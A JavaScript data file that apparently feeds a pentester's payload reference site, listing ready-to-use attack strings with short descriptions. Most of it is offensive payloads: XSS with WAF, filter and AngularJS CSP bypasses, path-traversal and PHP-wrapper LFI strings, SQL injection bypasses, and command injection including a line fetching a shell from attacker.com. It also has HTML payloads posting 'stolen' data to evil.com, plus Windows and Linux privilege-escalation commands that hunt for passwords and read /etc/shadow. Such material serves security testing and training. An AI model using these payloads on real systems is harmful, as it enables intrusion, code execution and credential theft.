// Data repository for Security Payload Repository

// Wordlists data
const wordlistsData = [
    {
        name: "Raft medium form SecLists",
        description: "Collection of multiple types of lists used during security assessments",
        link: "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/raft-medium-directories.txt"
    },
    {
        name: "RockYou.txt",
        description: "Famous password wordlist with 14 million passwords",
        link: "https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz"
    },
    {
        name: "LFI-Jhaddix",
        description: "LFI payloads and patterns",
        link: "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt"
    },
    {
        name: "OnelistForAll",
        description: "Dictionary of attack patterns and primitives",
        link: "https://raw.githubusercontent.com/six2dez/OneListForAll/refs/heads/main/onelistforallshort.txt"
    },
    {
        name: "Jhaddix DNS",
        description: "comprehensive list of DNS subdomains and patterns",
        link: "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt"
    },
    {
        name: "Backup Files Wordlist",
        description: "Comprehensive list of backup file extensions and patterns",
        link: "https://raw.githubusercontent.com/coffinxp/payloads/refs/heads/main/backup_files_only.txt"
    },
    {
        name: "SQL Authentication Payloads",
        description: "Comprehensive wordlist of SQL authentication bypass payloads",
        link: "https://raw.githubusercontent.com/Jaikumar3/Wordlists/refs/heads/main/Sql%20auth%20Payloads"
    } 
];

// XSS Payloads data organized by categories (based on PortSwigger's XSS Cheat Sheet)
const xssData = {
    basicPayloads: [
        {
            payload: "<script>alert(1)</script>",
            description: "Basic JavaScript alert payload"
        },
        {
            payload: "<img src=x onerror=alert(1)>",
            description: "Image error event XSS payload"
        },
        {
            payload: "<svg/onload=alert(1)>",
            description: "SVG onload event XSS payload"
        },
        {
            payload: "javascript:alert(1)",
            description: "JavaScript protocol handler XSS payload"
        }
    ],
    tagsBypass: [
        {
            payload: "<img src=1 onerror=alert(1)>",
            description: "Basic img tag XSS"
        },
        {
            payload: "<iframe src=\"javascript:alert(1)\"></iframe>",
            description: "iframe JavaScript protocol XSS"
        },
        {
            payload: "<svg><animate onbegin=alert(1) attributeName=x></svg>",
            description: "SVG animate tag XSS"
        },
        {
            payload: "<body onload=alert(1)>",
            description: "Body onload event XSS payload"
        },
        {
            payload: "<video><source onerror=\"javascript:alert(1)\">",
            description: "Video source error XSS payload"
        },
        {
            payload: "<audio src=x onerror=alert(1)>",
            description: "Audio error XSS payload"
        },
        {
            payload: "<script>onerror=alert;throw 1</script>",
            description: "Error handling XSS with throw statement"
        },
        {
            payload: "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\"></table></mtext></math>",
            description: "Complex MathML and table payload for WAF bypass"
        }
    ],
    attributesBypass: [
        {
            payload: "\" autofocus onfocus=alert(1) x=\"",
            description: "Autofocus attribute XSS"
        },
        {
            payload: "\" onfocus=alert(1) autofocus x=\"",
            description: "Onfocus attribute XSS"
        },
        {
            payload: "\" onmouseover=\"alert(1)",
            description: "Onmouseover attribute XSS"
        },
        {
            payload: "\" onload=\"alert(1)",
            description: "Onload attribute XSS"
        },
        {
            payload: "\" oninput=alert(1) x=\"",
            description: "Oninput attribute XSS"
        },
        {
            payload: "\" ontoggle=alert(1) id=x tabindex=1 style=display:block>#x",
            description: "Ontoggle attribute XSS"
        },
        {
            payload: "\" accesskey=\"x\" onclick=\"alert(1)\" x=\"",
            description: "Accesskey triggered XSS (press ALT+SHIFT+X on Windows)"
        },
        {
            payload: "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>",
            description: "SVG link XSS via xlink:href"
        }
    ],
    htmlEncoded: [
        {
            payload: "&lt;script&gt;alert(1)&lt;/script&gt;",
            description: "HTML encoded script tags"
        },
        {
            payload: "&lt;img src=x onerror=alert(1)&gt;",
            description: "HTML encoded img tag"
        },
        {
            payload: "&lt;svg onload=alert(1)&gt;",
            description: "HTML encoded SVG tag"
        },
        {
            payload: "&#60;script&#62;alert(1)&#60;/script&#62;",
            description: "Decimal HTML encoded script tag"
        },
        {
            payload: "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
            description: "Hexadecimal HTML encoded script tag"
        },
        {
            payload: "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            description: "URL encoded script tag"
        },
        {
            payload: "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
            description: "JavaScript hex escaped payload"
        }
    ],
    domBasedXSS: [
        {
            payload: "document.location.hash.substring(1)",
            description: "Extract hash fragment from URL"
        },
        {
            payload: "document.location.search.substring(1)",
            description: "Extract query string from URL"
        },
        {
            payload: "document.referrer",
            description: "Access document referrer"
        },
        {
            payload: "window.name",
            description: "Access window name property"
        },
        {
            payload: "location.href.match(/\\w+/)[0]",
            description: "URL parsing with regular expression"
        },
        {
            payload: "new Function(location.hash.slice(1))",
            description: "Function constructor with URL hash"
        },
        {
            payload: "eval(atob(location.hash.slice(1)))",
            description: "Base64 decoded eval from URL hash"
        },
        {
            payload: "document.write('<script>x='+location.hash.slice(1)+';<\\/script>')",
            description: "document.write from URL fragment"
        }
    ],
    filterEvasion: [
        {
            payload: "<script>eval(atob('YWxlcnQoMSk='))</script>",
            description: "Base64 encoded payload (alert(1))"
        },
        {
            payload: "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            description: "Character code encoding"
        },
        {
            payload: "<script>throw onerror=alert,1</script>",
            description: "Throw statement to trigger alert"
        },
        {
            payload: "<script>({x:1})[\"constructor\"][\"constructor\"](\"alert(1)\")();</script>",
            description: "Constructor method execution"
        },
        {
            payload: "<script>function x(){ return this; }; x().alert(1);</script>",
            description: "Window reference via function scoping trick"
        },
        {
            payload: "<script>top[\"al\"+'ert'](1)</script>",
            description: "String concatenation to bypass filters"
        },
        {
            payload: "<script>/alert(1)/.source</script>",
            description: "Regular expression source property"
        },
        {
            payload: "<script>'alert(1)'.replace(/.+/, eval)</script>",
            description: "String replace with eval"
        }
    ],
    eventHandlers: [
        {
            payload: "<div onmouseover=\"alert(1)\">Hover Me</div>",
            description: "Mouse over event XSS payload"
        },
        {
            payload: "<details open ontoggle=alert(1)>",
            description: "Details element XSS payload"
        },
        {
            payload: "<select autofocus onfocus=alert(1)>",
            description: "Select focus event XSS"
        },
        {
            payload: "<input autofocus onfocus=alert(1)>",
            description: "Input focus event XSS"
        },
        {
            payload: "<textarea autofocus onfocus=alert(1)>",
            description: "Textarea focus event XSS"
        },
        {
            payload: "<iframe onload=alert(1)>",
            description: "Iframe load event XSS"
        },
        {
            payload: "<marquee onstart=alert(1)>",
            description: "Marquee start event XSS"
        },
        {
            payload: "<video autoplay onplay=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
            description: "Video play event XSS"
        }
    ],
    wafBypass: [
        {
            payload: "<script>alert&#40;1&#41</script>",
            description: "HTML entity encoding of parentheses"
        },
        {
            payload: "<script>confirm`1`</script>",
            description: "ES6 template literals (no parentheses)"
        },
        {
            payload: "<script>[1].find(alert)</script>",
            description: "Array method bypass (works in Firefox)"
        },
        {
            payload: "<script>window['alert'](1)</script>",
            description: "Bracket notation for function name"
        },
        {
            payload: "<script>top['ale'+'rt'](1)</script>",
            description: "String concatenation in bracket notation"
        },
        {
            payload: "<a href=\"javascript:void(alert(1))\">Click me</a>",
            description: "Javascript void with alert"
        },
        {
            payload: "<svg><animate onbegin=prompt(1) attributeName=x dur=1s>",
            description: "SVG animation event"
        },
        {
            payload: "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
            description: "Custom element with focus"
        }
    ],
    polyglots: [
        {
            payload: "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\x3e",
            description: "XSS polyglot that works in many contexts"
        },
        {
            payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
            description: "XSS polyglot with onclick event"
        },
        {
            payload: "'>\">\"><img src=x onerror=alert(1)>",
            description: "Simple context breaking polyglot"
        },
        {
            payload: "\"-confirm(1)-\"",
            description: "Attribute breaking polyglot"
        },
        {
            payload: "<w=\"/x=\"y>\"/ondblclick=`<`[alert``]>z",
            description: "Complex polyglot using ES6 features"
        },
        {
            payload: "\"'><svg/onload=';alert(1);'>",
            description: "SVG-based polyglot"
        },
        {
            payload: "\";alert(1)//",
            description: "Basic script context polyglot"
        },
        {
            payload: "'-confirm`1`-'",
            description: "Attribute quote breaking with ES6 templates"
        }
    ],
    contextSpecific: [
        {
            payload: "<script>alert(1)</script>",
            description: "HTML context - No additional encoding needed",
            browser: "All browsers"
        },
        {
            payload: "\"></span><script>alert(1)</script>",
            description: "Breaking out of HTML tag attribute and inserting script",
            browser: "All browsers"
        },
        {
            payload: "javascript:alert(1)",
            description: "URL context XSS in href, src, etc.",
            browser: "All browsers"
        },
        {
            payload: "'-alert(1)-'",
            description: "JavaScript string context break-out",
            browser: "All browsers"
        },
        {
            payload: "</script><script>alert(1)</script>",
            description: "Breaking out of existing script tag",
            browser: "All browsers"
        },
        {
            payload: "{{constructor.constructor('alert(1)')()}}",
            description: "AngularJS template injection",
            browser: "Sites using AngularJS"
        },
        {
            payload: "${alert(1)}",
            description: "JavaScript template literal injection",
            browser: "Modern browsers"
        },
        {
            payload: "<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>",
            description: "SVG-based context",
            browser: "Chrome, Firefox"
        }
    ],
    browserSpecific: [
        {
            payload: "<img src=x onerror=alert(1)>",
            description: "Image error event - works in all browsers",
            browser: "All browsers"
        },
        {
            payload: "<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ホ+ネ+ヘ+ナ+ホ+ヌ+ツ+ネ+ホ+ミ+ハ](セ+ミ+ホ+ヌ+ネ+'(-~ウ)')()[ツ]</script>",
            description: "JSFuck-style obfuscation - Chrome-specific",
            browser: "Chrome"
        },
        {
            payload: "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
            description: "XML namespaces in XHTML",
            browser: "Firefox"
        },
        {
            payload: "<div style=\"x:expression(alert(1))\">",
            description: "CSS expression in style (legacy)",
            browser: "Internet Explorer"
        },
        {
            payload: "<svg><set attributeName=\"onload\" to=\"alert(1)\" />",
            description: "SVG animation with attributeName",
            browser: "Firefox, Chrome"
        },
        {
            payload: "<link rel=\"import\" href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            description: "HTML Import feature (deprecated)",
            browser: "Chrome (older versions)"
        }
    ],
    cssBased: [
        {
            payload: "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
            description: "CSS Animation event handler XSS",
            browser: "Chrome, Firefox"
        },
        {
            payload: "<style>*[x]{color:red}</style><xss x=\"\" onbeforecopy=\"alert(1)\">Copy me</xss>",
            description: "CSS Selector + onbeforecopy event",
            browser: "Chrome"
        },
        {
            payload: "<style>:target {color:red}</style><xss id=x style=\"transition:color 1s\" ontransitionend=alert(1)></xss>",
            description: "CSS Transition + ontransitionend event",
            browser: "Chrome, Firefox"
        },
        {
            payload: "<style>input:focus { outline: 1px solid red; }</style><input onblur=alert(1) id=x>",
            description: "CSS pseudo-class with onblur event",
            browser: "All browsers"
        }
    ],
    // New HTML-specific payloads
    htmlSpecific: [
        {
            payload: "<form><button formaction=javascript:alert(1)>XSS</button></form>",
            description: "Form button formaction attribute XSS"
        },
        {
            payload: "<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>",
            description: "HTML5 form events for XSS"
        },
        {
            payload: "<input type=image src=x onerror=alert(1)>",
            description: "Input image source error XSS"
        },
        {
            payload: "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</maction></math>",
            description: "MathML actiontype XSS"
        },
        {
            payload: "<object data=javascript:alert(1)>",
            description: "Object data attribute XSS"
        },
        {
            payload: "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
            description: "Iframe srcdoc attribute XSS"
        },
        {
            payload: "<table background=javascript:alert(1)></table>",
            description: "Table background attribute XSS"
        },
        {
            payload: "<map><area shape=rect coords=0,0,82,126 href=javascript:alert(1)>",
            description: "Image map area href XSS"
        },
        {
            payload: "<input type=hidden accesskey=x onclick=alert(1)>",
            description: "Hidden input with accesskey XSS (press ALT+SHIFT+X)"
        },
        {
            payload: "<embed src=javascript:alert(1)>",
            description: "Embed tag source XSS"
        },
        {
            payload: "<menu id=x contextmenu=x onshow=alert(1)>right click me!</menu>",
            description: "HTML5 context menu XSS"
        },
        {
            payload: "<isindex type=image src=1 onerror=alert(1)>",
            description: "Legacy isindex tag XSS (obsolete but still works in some browsers)"
        }
    ],
    // New Angular-specific payloads
    angularPayloads: [
        {
            payload: "{{constructor.constructor('alert(1)')()}}",
            description: "Basic AngularJS template injection"
        },
        {
            payload: "{{$eval.constructor('alert(1)')()}}",
            description: "AngularJS $eval service exploitation"
        },
        {
            payload: "{{$on.constructor('alert(1)')()}}",
            description: "AngularJS $on service exploitation"
        },
        {
            payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
            description: "AngularJS charAt prototype override"
        },
        {
            payload: "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
            description: "Complex AngularJS prototype pollution"
        },
        {
            payload: "{{constructor.constructor('alert(document.domain)')()}}",
            description: "AngularJS with document.domain for origin identification"
        },
        {
            payload: "{{[].map.constructor('alert(1)')()}}",
            description: "AngularJS map method exploitation"
        },
        {
            payload: "{{'a'.constructor.fromCharCode=[].join;$eval('x=alert(1)')}}",
            description: "AngularJS fromCharCode method override"
        },
        {
            payload: "<div ng-app ng-csp><input autofocus ng-focus=$event.path|orderBy:'(z=alert)(1)'>",
            description: "AngularJS event object exploitation with CSP bypass"
        },
        {
            payload: "<div ng-app ng-csp><input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>",
            description: "AngularJS composedPath method exploitation with CSP bypass"
        },
        {
            payload: "<div ng-app>{{$on.constructor('alert(1)')()}}</div>",
            description: "AngularJS in div context"
        },
        {
            payload: "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()</div>",
            description: "AngularJS with Content Security Policy bypass"
        },
        {
            payload: "<div ng-app ng-csp>{{$eval('JSON.parse(\"{\\\"constructor\\\":{\\\"prototype\\\":{\\\"charAt\\\":alert}}}\")[\\'constructor\\'].prototype.charAt(1)')}}</div>",
            description: "AngularJS JSON.parse exploitation and prototype chain"
        },
        {
            payload: "<script>Object.defineProperties(window, {chromium: {value: 1}});</script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            description: "AngularJS sandbox escape with Object.defineProperties"
        }
    ]
};

// LFI Payloads data
const lfiData = [
    {
        payload: "../../../etc/passwd",
        description: "Basic LFI payload for Unix-like systems"
    },
    {
        payload: "../../../../../../etc/passwd",
        description: "Deep path traversal LFI payload"
    },
    {
        payload: "../../../../../../windows/win.ini",
        description: "Windows file inclusion payload"
    },
    {
        payload: "php://filter/convert.base64-encode/resource=index.php",
        description: "PHP filter wrapper to read source code"
    },
    {
        payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        description: "Data wrapper for PHP code execution"
    },
    {
        payload: "expect://id",
        description: "Expect wrapper for command execution"
    },
    {
        payload: "/proc/self/environ",
        description: "Access environment variables in Linux"
    },
    {
        payload: "php://input",
        description: "PHP input stream wrapper for code injection"
    }
];

// Command Injection Payloads data
const cmdInjectionData = [
    {
        payload: "; ls -la",
        description: "Basic command separator for Unix-like systems"
    },
    {
        payload: "| cat /etc/passwd",
        description: "Pipe to execute second command"
    },
    {
        payload: "`id`",
        description: "Command substitution using backticks"
    },
    {
        payload: "$(id)",
        description: "Command substitution using $() syntax"
    },
    {
        payload: "& whoami",
        description: "Background command execution"
    },
    {
        payload: "%0A ping -c 4 127.0.0.1",
        description: "URL encoded newline for command injection"
    },
    {
        payload: "> /var/www/html/shell.php",
        description: "Redirect output to create a file"
    },
    {
        payload: "|| curl https://attacker.com/shell.php -o shell.php",
        description: "Logical OR for command execution"
    }
];

// SQL Injection Payloads data
const sqlInjectionData = [
    {
        payload: "' OR 1=1 --",
        description: "Basic SQL authentication bypass"
    },
    {
        payload: "' UNION SELECT 1,2,3 --",
        description: "Basic UNION-based SQL injection"
    },
    {
        payload: "' OR '1'='1",
        description: "Alternative SQL authentication bypass"
    },
    {
        payload: "1' OR '1' = '1' /*",
        description: "SQL injection using comment"
    },
    {
        payload: "' OR 1=1 ORDER BY 1 --",
        description: "SQL injection with ORDER BY"
    },
    {
        payload: "admin'--",
        description: "Comment out remainder of the query"
    },
    {
        payload: "'; WAITFOR DELAY '0:0:5' --",
        description: "Time-based SQL injection for MS SQL"
    },
    {
        payload: "' OR (SELECT SLEEP(5)) --",
        description: "Time-based SQL injection for MySQL"
    }
];

// Regex Patterns data
const regexData = [
    {
        pattern: "^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,6})*$",
        description: "Email address validation"
    },
    {
        pattern: "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
        description: "IPv4 address validation"
    },
    {
        pattern: "^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$",
        description: "MAC address validation"
    },
    {
        pattern: "^(?:https?:\\/\\/)?(?:www\\.)?[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(?:\\/[\\w\\-._~:/?#[\\]@!$&'()*+,;=]*)?$",
        description: "URL validation"
    },
    {
        pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$",
        description: "Strong password validation"
    },
    {
        pattern: "(?:[^<]*)<([^>]*)>(?:[^<]*)<\\/\\1>(?:[^<]*)",
        description: "Match HTML tags"
    },
    {
        pattern: "(?:\\d{1,3}\\.){3}\\d{1,3}(?=\\D|$)",
        description: "Find IP addresses in text"
    },
    {
        pattern: "\\b(?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2})\\b",
        description: "Find MAC addresses in text"
    }
];

// External Resources data
const resourcesData = [
    {
        name: "PayloadsAllTheThings",
        description: "A list of useful payloads and bypass for Web Application Security",
        link: "https://github.com/swisskyrepo/PayloadsAllTheThings"
    },
    {
        name: "OWASP Cheat Sheet Series",
        description: "Collection of high value information on specific application security topics",
        link: "https://cheatsheetseries.owasp.org/"
    },
    {
        name: "HackTricks",
        description: "Comprehensive hacking techniques and tips",
        link: "https://book.hacktricks.xyz/"
    },
    {
        name: "Pentester's Lab",
        description: "Hands-on labs for security testing practice",
        link: "https://pentesterlab.com/"
    },
    {
        name: "PortSwigger Web Security Academy",
        description: "Free online training for web security testing",
        link: "https://portswigger.net/web-security"
    },
    {
        name: "Exploit Database",
        description: "Archive of exploits and vulnerable software",
        link: "https://www.exploit-db.com/"
    }
];

// HTML Payloads data (separate from XSS)
const htmlPayloadsData = [
    {
        payload: "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
        description: "Meta refresh redirect to external site"
    },
    {
        payload: "<iframe src=\"http://evil.com\" width=\"800\" height=\"600\"></iframe>",
        description: "Basic iframe to load external content"
    },
    {
        payload: "<marquee behavior=\"alternate\" direction=\"left\" scrollamount=\"10\">Scrolling Text</marquee>",
        description: "Marquee element for scrolling text"
    },
    {
        payload: "<blink>Blinking text</blink>",
        description: "Blink element (deprecated)"
    },
    {
        payload: "<base href=\"http://evil.com/\">",
        description: "Base tag to modify relative URL resolution"
    },
    {
        payload: "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\"></object>",
        description: "Object with data URI containing Base64 encoded HTML"
    },
    {
        payload: "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\">",
        description: "Embed with data URI containing Base64 encoded HTML"
    },
    {
        payload: "<video autoplay><source src=\"http://evil.com/video.mp4\" type=\"video/mp4\"></video>",
        description: "Autoplaying video element"
    },
    {
        payload: "<audio autoplay loop><source src=\"http://evil.com/audio.mp3\" type=\"audio/mpeg\"></audio>",
        description: "Autoplaying audio element"
    },
    {
        payload: "<link rel=\"import\" href=\"http://evil.com/page.html\">",
        description: "HTML imports (deprecated feature)"
    },
    {
        payload: "<details open><summary>Details Title</summary>Content that is shown when open.</details>",
        description: "Details/summary elements for expandable content"
    },
    {
        payload: "<template id=\"template\"><div>Template content</div></template>",
        description: "HTML template element"
    },
    {
        payload: "<picture><source srcset=\"http://evil.com/img.webp\" type=\"image/webp\"><img src=\"fallback.jpg\"></picture>",
        description: "Picture element with multiple sources"
    },
    {
        payload: "<portal src=\"http://evil.com/\"></portal>",
        description: "Portal element (experimental)"
    },
    {
        payload: "<math><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>",
        description: "MathML for mathematical formulas"
    },
    {
        payload: "<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\"/></svg>",
        description: "SVG inline graphics"
    },
    {
        payload: "<form action=\"http://evil.com/log.php\" method=\"POST\"><input type=\"hidden\" name=\"stolen\" value=\"data\"><input type=\"submit\"></form>",
        description: "Form with hidden input"
    },
    {
        payload: "<input type=\"file\" accept=\"image/*\" capture=\"camera\">",
        description: "File input with camera capture"
    }
];

// Windows Privilege Escalation data
const windowsPrivescData = [
    {
        payload: "whoami /priv",
        description: "Display the security privileges of the current user"
    },
    {
        payload: "whoami /groups",
        description: "Display group membership of the current user"
    },
    {
        payload: "net user %username%",
        description: "Display information about the current user account"
    },
    {
        payload: "net localgroup administrators",
        description: "List members of the local administrators group"
    },
    {
        payload: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
        description: "Find services with unquoted paths that might be exploitable"
    },
    {
        payload: "wmic service get name,displayname,startmode,pathname | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\system32\"",
        description: "Alternative to find services with unquoted paths"
    },
    {
        payload: "icacls \"C:\\Program Files\\*\" | findstr \"BUILTIN\\Users:(F)\" | findstr \":(F)\"",
        description: "Check for write permissions in Program Files"
    },
    {
        payload: "icacls \"C:\\Program Files (x86)\\*\" | findstr \"BUILTIN\\Users:(F)\" | findstr \":(F)\"",
        description: "Check for write permissions in Program Files (x86)"
    },
    {
        payload: "schtasks /query /fo LIST /v",
        description: "List all scheduled tasks on the system"
    },
    {
        payload: "netsh firewall show state",
        description: "Show the firewall configuration"
    },
    {
        payload: "netsh firewall show config",
        description: "Show the firewall configuration details"
    },
    {
        payload: "reg query HKLM /f password /t REG_SZ /s",
        description: "Search for passwords in the registry"
    },
    {
        payload: "reg query HKCU /f password /t REG_SZ /s",
        description: "Search for passwords in the current user registry"
    },
    {
        payload: "cmdkey /list",
        description: "List stored credentials"
    },
    {
        payload: "wmic product get name,version,vendor",
        description: "List installed applications"
    },
    {
        payload: "systeminfo",
        description: "Get detailed system information to identify missing patches"
    },
    {
        payload: "wmic qfe get Caption,Description,HotFixID,InstalledOn",
        description: "List installed patches"
    },
    {
        payload: "dir /s *pass* == *cred* == *vnc* == *.config*",
        description: "Search for sensitive files"
    },
    {
        payload: "findstr /si password *.xml *.ini *.txt *.config *.bat",
        description: "Search for passwords in various file types"
    },
    {
        payload: "tasklist /SVC",
        description: "List running processes and their associated services"
    }
];

// Resources specifically for Windows privilege escalation
const windowsPrivescResourcesData = [
    {
        name: "LOLBAS",
        description: "Living Off The Land Binaries and Scripts - Windows binaries that can be abused",
        link: "https://lolbas-project.github.io/"
    },
    {
        name: "PayloadsAllTheThings - Windows Privilege Escalation",
        description: "Comprehensive guide for Windows privilege escalation techniques",
        link: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md"
    },
    {
        name: "PowerUp.ps1",
        description: "PowerShell script for Windows privilege escalation enumeration",
        link: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
    },
    {
        name: "WinPEAS",
        description: "Windows Privilege Escalation Awesome Script",
        link: "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"
    },
    {
        name: "Windows Exploit Suggester - Next Generation",
        description: "Tool to identify exploits for vulnerable Windows components",
        link: "https://github.com/bitsadmin/wesng"
    },
    {
        name: "Priv2Admin",
        description: "Windows Privilege Escalation to Admin tools and techniques",
        link: "https://github.com/gtworek/Priv2Admin"
    },
    {
        name: "HackTricks - Windows Privilege Escalation",
        description: "Detailed guide for Windows privilege escalation techniques",
        link: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
    },
    {
        name: "WindowsEnum",
        description: "PowerShell enumeration script for Windows privilege escalation",
        link: "https://github.com/absolomb/WindowsEnum"
    },
    {
        name: "PrivescCheck",
        description: "Privilege Escalation Enumeration Script for Windows",
        link: "https://github.com/itm4n/PrivescCheck"
    }
];

// Linux Privilege Escalation data
const linuxPrivescData = [
    {
        payload: "id",
        description: "Display user and group IDs"
    },
    {
        payload: "uname -a",
        description: "Print system information"
    },
    {
        payload: "cat /etc/issue; cat /etc/*-release",
        description: "Show Linux distribution information"
    },
    {
        payload: "cat /proc/version",
        description: "Display kernel information"
    },
    {
        payload: "hostname",
        description: "Show system hostname"
    },
    {
        payload: "cat /etc/passwd",
        description: "List all users on the system"
    },
    {
        payload: "cat /etc/shadow",
        description: "Try to read shadow password file (requires privileges)"
    },
    {
        payload: "cat /etc/group",
        description: "List all groups on the system"
    },
    {
        payload: "ls -la /etc/sudoers; sudo -l",
        description: "Check sudo permissions"
    },
    {
        payload: "find / -perm -u=s -type f 2>/dev/null",
        description: "Find SUID files"
    },
    {
        payload: "find / -perm -g=s -type f 2>/dev/null",
        description: "Find SGID files"
    },
    {
        payload: "find / -writable -type d 2>/dev/null",
        description: "Find world-writeable directories"
    },
    {
        payload: "find / -writable -type f 2>/dev/null",
        description: "Find world-writeable files"
    },
    {
        payload: "find / -user root -perm -4000 -exec ls -ld {} \\; 2>/dev/null",
        description: "Find root owned files with SUID bit set"
    },
    {
        payload: "crontab -l; ls -la /etc/cron*",
        description: "List scheduled cron jobs"
    },
    {
        payload: "ps aux | grep root",
        description: "Find processes running as root"
    },
    {
        payload: "netstat -tulpn",
        description: "Show listening ports and associated processes"
    },
    {
        payload: "cat /etc/fstab",
        description: "Show mounted file systems"
    },
    {
        payload: "find / -name '*.bak' -o -name '*.old' 2>/dev/null",
        description: "Find backup files"
    },
    {
        payload: "env",
        description: "Show environment variables"
    }
];

// Resources specifically for Linux privilege escalation
const linuxPrivescResourcesData = [
    {
        name: "PayloadsAllTheThings - Linux Privilege Escalation",
        description: "Comprehensive guide for Linux privilege escalation techniques",
        link: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"
    },
    {
        name: "GTFOBins",
        description: "Unix binaries that can be exploited for privilege escalation",
        link: "https://gtfobins.github.io/"
    },
    {
        name: "LinPEAS",
        description: "Linux Privilege Escalation Awesome Script",
        link: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
    },
    {
        name: "Linux Exploit Suggester 2",
        description: "Tool to identify potential privilege escalation vectors",
        link: "https://github.com/jondonas/linux-exploit-suggester-2"
    },
    {
        name: "LinEnum",
        description: "Scripted Local Linux Enumeration & Privilege Escalation Checks",
        link: "https://github.com/rebootuser/LinEnum"
    },
    {
        name: "pspy",
        description: "Monitor Linux processes without root permissions",
        link: "https://github.com/DominicBreuker/pspy"
    },
    {
        name: "linux-smart-enumeration",
        description: "Linux enumeration tool for pentesting and CTFs",
        link: "https://github.com/diego-treitos/linux-smart-enumeration"
    },
    {
        name: "HackTricks - Linux Privilege Escalation",
        description: "Detailed guide for Linux privilege escalation techniques",
        link: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
    },
    {
        name: "Linux Privilege Escalation Checklist",
        description: "g0tmi1k's Linux Privilege Escalation guide",
        link: "https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"
    },
    {
        name: "unix-privesc-check",
        description: "Shell script to check for simple privilege escalation vectors",
        link: "https://github.com/pentestmonkey/unix-privesc-check"
    }
];
